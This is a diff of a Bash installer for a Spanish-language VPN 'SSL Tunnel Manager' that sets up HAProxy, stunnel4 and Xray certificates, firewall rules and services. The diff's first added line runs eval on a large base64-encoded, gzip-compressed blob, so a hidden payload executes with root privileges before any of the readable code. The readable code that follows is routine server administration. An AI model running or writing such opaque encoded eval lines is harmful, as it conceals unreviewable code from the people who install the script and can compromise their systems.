@@ -1,4 +1,1114 @@
 #!/bin/bash
-# MoviVIP Network v8.0 — Obfuscated
-# Auto-generated — DO NOT EDIT
-eval "$(echo "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" | base64 -d | gzip -d)"
+
+# ── i18n shim (auto) ───────────────────────────────
+if ! declare -F trx >/dev/null 2>&1; then trx() { printf '%s' "$1"; }; fi
+# ─────────────────────────────────────────────────────────
+#==================================================
+# MoviVIP Network
+# SSL Tunnel Manager
+# Parte 1
+#==================================================
+
+GREEN="${MV_GRN:-\e[1;92m}"
+RED="${MV_RED:-\e[1;91m}"
+YELLOW="${MV_YLW:-\e[1;93m}"
+BLUE="${MV_BLU:-\e[1;94m}"
+CYAN="${MV_CYN:-\e[1;96m}"
+MAGENTA="${MV_MAG:-\e[1;95m}"
+WHITE="${MV_WHT:-\e[1;97m}"
+GRAY="${MV_DIM:-\e[1;90m}"
+RESET="${MV_R:-\e[0m}"
+
+HAPROXY_CFG="/etc/haproxy/haproxy.cfg"
+CERT_FILE="/etc/haproxy/yha.pem"
+SERVICE_FILE="/etc/systemd/system/ssh-ws-internal.service"
+PROXY_SCRIPT="/usr/local/bin/ssh-ws-internal.py"
+BASE="/etc/movivip"
+CONFIG="$BASE/config.conf"
+
+# Cargar funciones multi-distro
+[[ -f "$BASE/functions/pkg.sh" ]] && source "$BASE/functions/pkg.sh"
+
+
+# Sistema de animación/progreso + detección de estado
+[[ -f "$BASE/lib/anim.sh" ]] && source "$BASE/lib/anim.sh"
+
+line() {
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+}
+
+msg_ok() {
+    echo -e "${GREEN}✔${RESET} $1"
+}
+
+msg_error() {
+    echo -e "${RED}✘${RESET} $1"
+}
+
+msg_info() {
+    echo -e "${YELLOW}➜${RESET} $1"
+}
+
+install_dependencies() {
+
+    anim_step "Actualizando repositorios"
+    anim_run "apt update" pkg_update
+
+    anim_step "Instalando dependencias"
+
+    if ! anim_run "Instalar haproxy/ssl tools" pkg_install haproxy openssl python3 curl socat net-tools lsof; then
+        msg_error "No se pudieron instalar."
+        return 1
+    fi
+
+}
+
+generate_certificate() {
+
+    if [[ -f "$CERT_FILE" ]]; then
+        msg_ok "Certificado encontrado."
+        return
+    fi
+
+    msg_info "Generando certificado SSL con SAN..."
+
+    # Obtener dominio e IP del servidor
+    local DOMAIN
+    DOMAIN=$(hostname -f 2>/dev/null || echo "ssl-tunnel")
+    local IP
+    IP=$(curl -s4 ifconfig.me 2>/dev/null || echo "127.0.0.1")
+
+    # Crear archivo de configuración OpenSSL con SAN
+    local OPENSSL_CNF="/tmp/openssl-movivip.cnf"
+    cat > "$OPENSSL_CNF" <<EOFCNF
+[req]
+default_bits = 2048
+prompt = no
+default_md = sha256
+distinguished_name = dn
+x509_extensions = v3_req
+
+[dn]
+C = CO
+ST = Bogota
+L = Bogota
+O = MoviVIP Network
+OU = VPN
+CN = ${DOMAIN}
+
+[v3_req]
+subjectAltName = @alt_names
+
+[alt_names]
+DNS.1 = ${DOMAIN}
+DNS.2 = *.${DOMAIN}
+DNS.3 = ${DOMAIN#*.}
+IP.1 = ${IP}
+EOFCNF
+
+    openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
+        -keyout /tmp/key.pem \
+        -out /tmp/cert.pem \
+        -config "$OPENSSL_CNF" 2>/dev/null
+
+    cat /tmp/key.pem /tmp/cert.pem > "$CERT_FILE"
+
+    rm -f /tmp/key.pem /tmp/cert.pem "$OPENSSL_CNF"
+
+    chmod 600 "$CERT_FILE"
+
+    msg_ok "Certificado creado con SAN para ${DOMAIN}"
+
+}
+
+install_stunnel4() {
+
+    if ! command -v stunnel4 &>/dev/null && ! command -v stunnel &>/dev/null; then
+        anim_step "Instalando stunnel4"
+        anim_run "Instalar stunnel4" pkg_install stunnel4
+    fi
+
+    local STUNNEL_CONF="/etc/stunnel/stunnel.conf"
+    local STUNNEL_PEM="/etc/stunnel/stunnel.pem"
+
+    # Generar cert stunnel si no existe
+    if [[ ! -f "$STUNNEL_PEM" ]]; then
+        openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
+            -keyout /etc/stunnel/stunnel.key \
+            -out /etc/stunnel/stunnel.crt \
+            -subj "/CN=stunnel/O=MoviVIP" 2>/dev/null
+        cat /etc/stunnel/stunnel.crt /etc/stunnel/stunnel.key > "$STUNNEL_PEM"
+        chmod 600 "$STUNNEL_PEM"
+    fi
+
+    # Crear config stunnel si no existe
+    if [[ ! -f "$STUNNEL_CONF" ]]; then
+        cat > "$STUNNEL_CONF" <<'STEOF'
+pid = /run/stunnel4/stunnel.pid
+setuid = stunnel4
+setgid = stunnel4
+
+[ssh-dropbear]
+    accept = 0.0.0.0:445
+    connect = 127.0.0.1:109
+    cert = /etc/stunnel/stunnel.pem
+
+[ssh-dropbear2]
+    accept = 0.0.0.0:844
+    connect = 127.0.0.1:143
+    cert = /etc/stunnel/stunnel.pem
+
+[ssh-dropbear3]
+    accept = 0.0.0.0:444
+    connect = 127.0.0.1:90
+    cert = /etc/stunnel/stunnel.pem
+STEOF
+    fi
+
+    mkdir -p /run/stunnel4
+    chown stunnel4:stunnel4 /run/stunnel4 2>/dev/null
+
+    systemctl enable stunnel4 >/dev/null 2>&1
+    svc_restart_anim stunnel4 "Arrancando stunnel4"
+    anim_info "stunnel4: puertos 445, 844, 444"
+
+}
+
+install_xray_certs() {
+
+    local XRAY_DIR="/usr/local/etc/xray"
+    local CERT_DIR="/etc/ssl/movivip"
+
+    if [[ -f "$XRAY_DIR/server.crt" && -f "$XRAY_DIR/server.key" ]]; then
+        msg_ok "Certificados Xray ya existen."
+        return
+    fi
+
+    msg_info "Copiando certificados para Xray..."
+
+    mkdir -p "$CERT_DIR"
+    cp "$CERT_FILE" "$XRAY_DIR/server.crt" 2>/dev/null
+    # Extraer solo el key del PEM para Xray
+    if [[ -f "$CERT_FILE" ]]; then
+        openssl rsa -in "$CERT_FILE" -out "$XRAY_DIR/server.key" 2>/dev/null
+    fi
+    chmod 600 "$XRAY_DIR/server.key" 2>/dev/null
+
+    msg_ok "Certificados copiados a Xray."
+
+}
+
+install_auto_sign() {
+
+    local SCRIPT="/usr/local/bin/auto-sign-domain"
+
+    if [[ -f "$SCRIPT" ]]; then
+        msg_ok "Script auto-sign ya instalado."
+        return
+    fi
+
+    cat > "$SCRIPT" <<'AUTOEOF'
+#!/bin/bash
+# Auto-sign SSL certificate for a new domain
+# Usage: auto-sign-domain <domain> [ip]
+
+DOMAIN="${1:-}"
+IP="${2:-$(curl -s4 ifconfig.me 2>/dev/null || echo '127.0.0.1')}"
+CERT_DIR="/etc/ssl/movivip"
+HAPROXY_CERT="/etc/haproxy/yha.pem"
+
+if [ -z "$DOMAIN" ]; then
+    echo "$(trx 'Uso: auto-sign-domain <dominio> [ip]')"
+    exit 1
+fi
+
+echo "Auto-signing certificate for: $DOMAIN"
+
+cat > /tmp/openssl_${DOMAIN}.cnf << EOFCNF
+[req]
+default_bits = 2048
+prompt = no
+default_md = sha256
+distinguished_name = dn
+x509_extensions = v3_req
+
+[dn]
+C = CO
+ST = Bogota
+L = Bogota
+O = MoviVIP Network
+OU = VPN
+CN = ${DOMAIN}
+
+[v3_req]
+subjectAltName = @alt_names
+
+[alt_names]
+DNS.1 = ${DOMAIN}
+DNS.2 = *.${DOMAIN}
+DNS.3 = ${DOMAIN#*.}
+IP.1 = ${IP}
+EOFCNF
+
+openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
+    -keyout "${CERT_DIR}/${DOMAIN}.key" \
+    -out "${CERT_DIR}/${DOMAIN}.crt" \
+    -config /tmp/openssl_${DOMAIN}.cnf 2>/dev/null
+
+cat "${CERT_DIR}/${DOMAIN}.crt" "${CERT_DIR}/${DOMAIN}.key" >> "$HAPROXY_CERT"
+chmod 600 "$HAPROXY_CERT"
+
+cp "${CERT_DIR}/${DOMAIN}.crt" /usr/local/etc/xray/
+cp "${CERT_DIR}/${DOMAIN}.key" /usr/local/etc/xray/
+
+systemctl reload haproxy 2>/dev/null || systemctl restart haproxy
+
+echo "OK: Certificate generated for $DOMAIN"
+AUTOEOF
+
+    chmod +x "$SCRIPT"
+    msg_ok "Script auto-sign-domain instalado."
+
+}
+
+open_firewall_udp() {
+
+    msg_info "Abriendo puertos UDP para Xray..."
+
+    # Puertos UDP de Xray (STUN, Reality, etc.)
+    for port in 6954 2958 34778 28648 46079 25609 53899 45768 19147 41175 19195; do
+        iptables -C INPUT -p udp --dport "$port" -j ACCEPT 2>/dev/null \
+            || iptables -I INPUT 6 -p udp --dport "$port" -j ACCEPT 2>/dev/null
+    done
+
+    # Puertos UDP de stunnel
+    for port in 445 844 444; do
+        iptables -C INPUT -p tcp --dport "$port" -j ACCEPT 2>/dev/null \
+            || iptables -I INPUT 5 -p tcp --dport "$port" -j ACCEPT 2>/dev/null
+    done
+
+    msg_ok "Puertos UDP abiertos."
+
+}
+
+kill_ports() {
+
+    msg_info "Liberando puertos..."
+
+    fuser -k 80/tcp >/dev/null 2>&1
+    fuser -k 443/tcp >/dev/null 2>&1
+    fuser -k 8080/tcp >/dev/null 2>&1
+    fuser -k 8443/tcp >/dev/null 2>&1
+
+    msg_ok "Puertos liberados."
+
+}
+
+remove_old_ws() {
+
+    systemctl stop ssh-ws.service >/dev/null 2>&1
+    systemctl stop ssh-wss.service >/dev/null 2>&1
+
+    systemctl disable ssh-ws.service >/dev/null 2>&1
+    systemctl disable ssh-wss.service >/dev/null 2>&1
+
+    rm -f /etc/systemd/system/ssh-ws.service
+    rm -f /etc/systemd/system/ssh-wss.service
+
+}
+
+ssl_tunnel_status() {
+
+    line
+
+    if systemctl is-active --quiet haproxy; then
+        echo -e "${GREEN}HAProxy : ACTIVO${RESET}"
+    else
+        echo -e "${RED}HAProxy : DETENIDO${RESET}"
+    fi
+
+    if systemctl is-active --quiet ssh-ws-internal.service; then
+        echo -e "${GREEN}SSH WS  : ACTIVO${RESET}"
+    else
+        echo -e "${RED}SSH WS  : DETENIDO${RESET}"
+    fi
+
+    if systemctl is-active --quiet stunnel4; then
+        echo -e "${GREEN}Stunnel : ACTIVO${RESET}"
+    else
+        echo -e "${RED}Stunnel : DETENIDO${RESET}"
+    fi
+
+    line
+
+}
+
+restart_ssl_tunnel() {
+
+    svc_restart_anim ssh-ws-internal.service "Reiniciando SSH WS Internal"
+    svc_restart_anim haproxy "Reiniciando HAProxy"
+    svc_restart_anim stunnel4 "Reiniciando stunnel4"
+
+    msg_ok "Servicios reiniciados."
+
+}
+
+remove_ssl_tunnel() {
+
+    anim_init 3
+    anim_step "Desinstalando SSL Tunnel"
+    anim_run "Detener servicios" bash -c "systemctl stop haproxy 2>/dev/null; systemctl disable haproxy 2>/dev/null; systemctl stop ssh-ws-internal.service 2>/dev/null; systemctl disable ssh-ws-internal.service 2>/dev/null; systemctl stop stunnel4 2>/dev/null; systemctl disable stunnel4 2>/dev/null"
+
+    anim_run "Eliminar configuraciones" bash -c "rm -f \"$HAPROXY_CFG\" \"$CERT_FILE\" \"$SERVICE_FILE\" \"$PROXY_SCRIPT\" /usr/local/bin/auto-sign-domain; rm -rf /etc/ssl/movivip"
+    anim_run "Limpiar certificados Xray" rm -f /usr/local/etc/xray/server.crt /usr/local/etc/xray/server.key
+
+    anim_run "daemon-reload" systemctl daemon-reload
+
+    grep -q "^SSL=" "$CONFIG" \
+    && sed -i 's/^SSL=.*/SSL=OFF/' "$CONFIG"
+
+grep -q "^SSL_TUNNEL=" "$CONFIG" \
+    && sed -i 's/^SSL_TUNNEL=.*/SSL_TUNNEL=OFF/' "$CONFIG"
+    
+    anim_done "SSL Tunnel eliminado."
+
+}
+
+ssl_tunnel_menu() {
+
+# Navegación con flechitas
+[[ -f "$BASE/lib/nav.sh" ]] && source "$BASE/lib/nav.sh"
+
+# ── CLI headless: bash ssl.sh --install
+if [[ "${1:-}" == "--install" ]]; then
+    install_ssl_tunnel
+    exit $?
+fi
+
+while true
+do
+clear
+
+source "$CONFIG" 2>/dev/null
+
+if systemctl is-active --quiet haproxy; then
+    STATUS="${GREEN}🟢 ACTIVO${RESET}"
+else
+    STATUS="${RED}🔴 DESINSTALADO${RESET}"
+fi
+
+mv_header "🔐 SSL Tunnel Manager" "$(trx 'HAProxy + stunnel4 · tráfico cifrado')" "v6.2"
+movivip_contacts 2>/dev/null || true
+
+echo -e " Estado      : $STATUS"
